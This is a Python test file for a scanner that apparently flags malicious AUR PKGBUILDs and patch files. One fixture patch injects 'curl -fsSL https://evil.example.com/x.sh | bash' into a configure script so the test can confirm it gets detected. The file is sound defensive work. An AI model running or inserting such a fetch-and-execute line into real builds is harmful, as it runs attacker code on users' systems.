from __future__ import annotations

import yaml
import pytest

from aurmanager.engine import scan
from aurmanager.loader import resolve
from aurmanager.model import Severity

from .conftest import benign_fixture_dirs, incident_fixture_dirs


@pytest.mark.parametrize("fixture_dir", incident_fixture_dirs(), ids=lambda p: p.name)
def test_incident_fixture_triggers_expected_findings(fixture_dir):
    expected = yaml.safe_load((fixture_dir / "expected_findings.yaml").read_text())
    files = resolve(fixture_dir / "PKGBUILD")
    result = scan(files)

    for exp in expected:
        matches = [f for f in result.findings if f.rule_id == exp["rule_id"]]
        assert matches, f"expected rule {exp['rule_id']} to fire for {fixture_dir.name}"

        min_severity = Severity.from_str(exp["min_severity"])
        assert any(f.severity >= min_severity for f in matches), (
            f"expected {exp['rule_id']} to fire at >= {exp['min_severity']} "
            f"for {fixture_dir.name}, got {[f.severity.name for f in matches]}"
        )

        line_contains = exp.get("line_contains")
        if line_contains:
            assert any(line_contains in (f.snippet or "") for f in matches), (
                f"expected a {exp['rule_id']} finding with snippet containing "
                f"{line_contains!r} for {fixture_dir.name}, got "
                f"{[f.snippet for f in matches]}"
            )


@pytest.mark.parametrize("fixture_dir", benign_fixture_dirs(), ids=lambda p: p.name)
def test_benign_fixture_has_no_high_severity_findings(fixture_dir):
    files = resolve(fixture_dir / "PKGBUILD")
    result = scan(files)
    bad = [f for f in result.findings if f.severity >= Severity.MEDIUM]
    assert not bad, f"unexpected findings on benign fixture {fixture_dir.name}: {bad}"


def test_scan_picks_up_and_flags_a_malicious_patch_file(tmp_path):
    # End-to-end: loader.resolve() must actually locate the .patch file next
    # to the PKGBUILD, and engine.scan() must parse and run rules against it
    # -- not just PAT001 in isolation (tests/test_rules/test_patch.py) but the
    # whole pipeline from a directory on disk.
    (tmp_path / "PKGBUILD").write_text(
        """
        pkgname=foo
        pkgver=1.0
        source=("fix.patch")
        sha256sums=('SKIP')
        prepare() {
          patch -p1 < fix.patch
        }
        """
    )
    (tmp_path / "fix.patch").write_text(
        """--- a/configure
+++ b/configure
@@ -1,3 +1,4 @@
 #!/bin/sh
 echo hi
+curl -fsSL https://evil.example.com/x.sh | bash
 echo done
"""
    )
    files = resolve(tmp_path / "PKGBUILD")
    result = scan(files)
    pat001 = [f for f in result.findings if f.rule_id == "PAT001"]
    assert len(pat001) == 1
    assert pat001[0].file == tmp_path / "fix.patch"


def test_scan_does_not_flag_a_benign_patch_file(tmp_path):
    (tmp_path / "PKGBUILD").write_text(
        """
        pkgname=foo
        pkgver=1.0
        source=("fix.patch")
        sha256sums=('SKIP')
        prepare() {
          patch -p1 < fix.patch
        }
        """
    )
    (tmp_path / "fix.patch").write_text(
        """--- a/configure
+++ b/configure
@@ -1,3 +1,3 @@
 #!/bin/sh
-make_flags="-O2"
+make_flags="-O3"
 echo done
"""
    )
    files = resolve(tmp_path / "PKGBUILD")
    result = scan(files)
    assert result.overall_verdict == Severity.INFO
